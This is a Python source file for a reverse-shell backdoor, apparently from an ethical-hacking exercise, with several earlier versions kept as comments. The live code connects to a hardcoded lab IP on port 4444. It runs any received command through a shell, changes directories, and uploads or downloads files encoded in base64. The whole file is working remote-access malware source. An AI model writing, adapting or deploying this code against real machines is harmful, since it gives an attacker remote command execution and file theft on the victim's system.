#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64


# fixing the issue with downloading images, .exe's, etc. Need to first make it base64
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket()
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-] Error: the command , " + command + " doesn't exist"

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except WindowsError:
            return "[-] Error: The path " + path + " doesn't exist"

    def read_file(self, path):
        with open(path, 'rb') as hacker_file:
            return base64.b64encode(hacker_file.read())  # makes images and other files work

    def write_file(self, path, content):
        with open(path, 'wb') as hacker_file:
            hacker_file.write(base64.b64decode(content))  # this will rewrite the file in its original format
            return "[+] " + path + " Upload Successful."

    def run(self):
        command_result = ""  # if there's a problem it's with this, I added it to stop a local assignment warning below
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                # need to figure out how to make to non case sensitive
                elif command[0] == "upload" or command[0] == "UPLOAD" or command[0] == "Upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "download" or command[0] == "DOWNLOAD" or command[0] == "Download":
                    command_result = self.read_file(command[1])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error: During command execution"

            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.220.137", 4444)
my_backdoor.run()


# class Backdoor:
#     def __init__(self, ip, port):
#         self.connection = socket.socket()
#         self.connection.connect((ip, port))
#
#     def reliable_send(self, data):
#         json_data = json.dumps(data)
#         self.connection.send(json_data)
#
#     def reliable_receive(self):
#         json_data = ""
#         while True:
#             try:
#                 json_data = json_data + self.connection.recv(1024)
#                 return json.loads(json_data)
#             except ValueError:
#                 continue
#
#     def execute_system_command(self, command):
#         return subprocess.check_output(command, shell=True)
#
#     def change_working_directory_to(self, path):
#         os.chdir(path)
#         return "[+] Changing working directory to " + path
#
#     def read_file(self, path):
#         with open(path, 'rb') as hacker_file:
#             return hacker_file.read()
#
#     def run(self):
#         command_result = ""  # if there's a problem it's with this, I added it to stop a local assignment warning below
#         while True:
#             command = self.reliable_receive()
#             if command[0] == "exit":
#                 self.connection.close()
#                 exit()
#             elif command[0] == "cd" and len(command) > 1:
#                 command_result = self.change_working_directory_to(command[1])
#             # need to figure out how to make to non case sensitive
#             elif command[0] == "download" or command[0] == "DOWNLOAD" or command[0] == "Download":
#                 command_result = self.read_file(command[1])
#             else:
#                 command_result = self.execute_system_command(command)
#
#             self.reliable_send(command_result)
#
#
# my_backdoor = Backdoor("192.168.220.133", 4444)
# my_backdoor.run()


# class Backdoor:
#     def __init__(self, ip, port):
#         self.connection = socket.socket()
#         self.connection.connect((ip, port))
#
#     def reliable_send(self, data):
#         json_data = json.dumps(data)
#         self.connection.send(json_data)
#
#     def reliable_receive(self):
#         json_data = ""
#         while True:
#             try:
#                 json_data = json_data + self.connection.recv(1024)
#                 return json.loads(json_data)
#             except ValueError:
#                 continue
#
#     def execute_system_command(self, command):
#         return subprocess.check_output(command, shell=True)
#
#     def change_working_directory_to(self, path):
#         os.chdir(path)
#         return "[+] Changing working directory to " + path
#
#     def run(self):
#         while True:
#             command = self.reliable_receive()
#             if command[0] == "exit":
#                 self.connection.close()
#                 exit()
#             elif command[0] == "cd" and len(command) > 1:
#                 command_result = self.change_working_directory_to(command[1])
#             else:
#                 command_result = self.execute_system_command(command)
#
#             self.reliable_send(command_result)
#
#
# my_backdoor = Backdoor("192.168.220.133", 4444)
# my_backdoor.run()

# ----------------------------------------------------------------------------------------------------------------------
# need to implement a more reliable reliable_send method
# class Backdoor:
#     def __init__(self, ip, port):
#         self.connection = socket.socket()
#         self.connection.connect((ip, port))
#
#     def reliable_send(self, data):
#         json_data = json.dumps(data)
#         self.connection.send(json_data)
#
#     def reliable_receive(self):
#         json_data = self.connection.recv(1024)
#         return json.loads(json_data)
#
#     def execute_system_command(self, command):
#         return subprocess.check_output(command, shell=True)
#
#     def run(self):
#         while True:
#             command = self.reliable_receive()
#             command_result = self.execute_system_command(command)
#             self.reliable_send(command_result)
#         connection.close()
#
#
# my_backdoor = Backdoor("192.168.220.133", 4444)
# my_backdoor.run()
# ----------------------------------------------------------------------------------------------------------------------
#
# # turned the backdoor into a class
# class Backdoor:
#     def __init__(self, ip, port):
#         self.connection = socket.socket()
#         self.connection.connect((ip, port))
#
#     def execute_system_command(self, command):
#         return subprocess.check_output(command, shell=True)
#
#     def run(self):
#         while True:
#             command = self.connection.recv(1024)
#             command_result = self.execute_system_command(command)
#             self.connection.send(command_result)
#         connection.close()
#
#
# my_backdoor = Backdoor("192.168.220.133", 4444)
# my_backdoor.run()
# ----------------------------------------------------------------------------------------------------------------------
#
#
# def execute_system_command(command):
#     return subprocess.check_output(command, shell=True)
#
#
# connection = socket.socket()
# connection.connect(("192.168.220.133", 4444))
#
# while True:
#     command = connection.recv(1024)
#     command_result = execute_system_command(command)
#     connection.send(command_result)
#
#
# connection.close()
